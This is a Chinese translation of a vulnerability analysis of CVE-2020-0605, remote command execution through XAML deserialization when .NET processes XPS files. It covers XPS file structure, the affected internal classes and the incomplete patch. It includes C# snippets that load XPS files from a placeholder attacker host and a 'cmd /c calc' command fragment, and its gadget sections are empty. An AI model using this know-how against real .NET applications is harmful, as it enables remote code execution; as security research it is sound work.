# CVE-2020-0605：.NET处理XPS文件时的命令执行
## 1\. 译文声明
本文是翻译文章，原作者 Soroush Dalili  
原文地址：  
译文仅作参考，具体内容表达请见原文
## 2\. 前言
微软近期修复了许多与XPS文件有关的反序列化漏洞，其中就包括[`CVE-2020-0605`](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0605)，`XPS`文件用于作为`PDF`文件的替代品，但其并未像后者那样普及，微软已在`Win10
1083 +`中将`XPS Viewer`默认安装，不过`XPS
Viewer`不调用`.NET`来读取XPS文件，因此不受该漏洞影响。该漏洞的补丁在今年一月就发布了，但是补丁不够完善，然后在今年五月对补丁进行了完善。该漏洞可用于攻击所有使用.NET处理XPS文件的业务场景，其已被确认的漏洞思路也可用于开发其它XAML反序列化漏洞的利用链。
## 3\. 技术分析
一个XPS文件就像一个压缩包，其内包含多类文件，例如图像、字体以及XML文档。`.NET`中基于[`XAML`](https://docs.microsoft.com/zh-cn/xamarin/xamarin-forms/xaml/xaml-basics/)来序列化处理XPS文件中的XML文件。  
一个简单的XPS文件结构如下：
    File.xps\DiscardControl.xml
    File.xps\FixedDocumentSequence.fdseq
    File.xps\[Content_Types].xml
    File.xps\Documents\1\FixedDocument.fdoc
    File.xps\Documents\1\Pages\1.fpage
    File.xps\Documents\1\Pages\_rels\1.fpage.rels
    File.xps\Documents\1\_rels\FixedDocument.fdoc.rels
    File.xps\Metadata\Job_PT-inqy3ql9shqm2dc_mcqr93k5g.xml
    File.xps\Metadata\SharedEmpty_PT-cn4rss5oojtjhxzju9tpamz4f.xml
    File.xps\Resources\Fonts\0D7703BF-30CA-4254-ABA0-1A8892E2A101.odttf
    File.xps\Resources\Images\00F8CA61-B050-4B6A-AFEF-139AA015AC08.png
    File.xps\_rels\.rels
    File.xps\_rels\FixedDocumentSequence.fdseq.rels
其中带有`.fdseql`、`.fdoc`、`.fpage`的文件使用了`XAML`序列化进程。不过如果在`[Content_Types].xml`文件中定义了合适的类型，也可以使用其他自定义的后缀名。  
[`ysoserial`](http://ysoserial.net/)项目中提供了以下通用exp以在读取XPS文件时来命令执行：
     cmd
     /c calc
一月份给出的补丁仅增加了对`.fdseq`格式文件的安全校验，不过仍可使用其它文件来触发漏洞。  
举两个怎样在.NET场景中读取XPS文件的例子，如下：
  * `XpsDocument`
        XpsDocument myDoc = new XpsDocument(@"http://[attackersite]/test.xps", FileAccess.Read);
    var a = myDoc.GetFixedDocumentSequence();
  * `LocalPrintServer` \+ `defaultPrintQueue`
        PrintQueue defaultPrintQueue = LocalPrintServer.GetDefaultPrintQueue();
    PrintSystemJobInfo xpsPrintJob = defaultPrintQueue.AddJob("test", @"http://[attackersite]/test.xps", false);
不过我们测试过程中发现XPS文件中的BAML（XAML的编译版本）文件无法触发漏洞，它们会导致内部错误。  
### 3.1. 受影响的.NET 内部类  
注：`internal
class`被译为了内部类，该`internal`修饰符表示被修饰的类或方法其访问权限仅限于当前程序集，关于C#中`internal`关键字的相关资料可[见此](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/internal)  
.NET其`System.Windows.Documents`命名空间下存在[`XpsValidatingLoader`类](https://referencesource.microsoft.com/#PresentationFramework/src/Framework/System/Windows/Documents/XPSS0ValidatingLoader.cs,4597a8124b66925a)，其中的`Load()`和`Validate()`方法在处理恶意XAML指令时可能会导致代码执行，因为它们都最终调用了[`XamlReader.Load()`](https://referencesource.microsoft.com/#PresentationFramework/src/Framework/System/Windows/Markup/XamlReader.cs)方法。  
关系图如下：
  * `System.Windows.Documents.XpsValidatingLoader`为内部类
    * 其内部方法`Load`在以下类中被调用：
      * [`System.Windows.Documents.PageContent`](https://referencesource.microsoft.com/#PresentationFramework/src/Framework/System/Windows/Documents/PageContent.cs)
      * [`System.Windows.Documents.FixedDocument`](https://referencesource.microsoft.com/#PresentationFramework/src/Framework/System/Windows/Documents/FixedDocument.cs)
      * [`System.Windows.Documents.DocumentReference`](https://referencesource.microsoft.com/#PresentationFramework/src/Framework/System/Windows/Documents/DocumentReference.cs)
    * 其内部方法`Validate`在以下类中被调用：
      * [`System.Windows.Documents.FixedDocument`](https://referencesource.microsoft.com/#PresentationFramework/src/Framework/System/Windows/Documents/FixedDocument.cs)
然后，上述所受影响的类最终可被其它公共类中所调用。
### 3.2. 一些基于XAML的Gadgets
#### 3.2.1. FixedDocument/FixedDocumentSequence + xaml引用
或者
#### 3.2.2. FixedDocument/FixedDocumentSequence类中的Resources属性
或者